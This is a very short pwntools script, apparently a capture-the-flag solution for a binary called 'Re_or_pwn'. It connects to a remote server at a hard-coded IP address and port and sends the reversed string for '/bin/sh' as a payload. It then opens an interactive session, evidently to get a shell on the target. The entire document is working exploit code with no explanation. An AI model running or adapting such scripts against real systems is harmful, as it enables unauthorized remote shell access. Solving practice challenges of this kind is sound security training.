from pwn import*

# io=process("./Re_or_pwn")
io=remote("1.14.71.254",28964)

payload=b"hs/nib/"
io.sendline(payload)
io.interactive()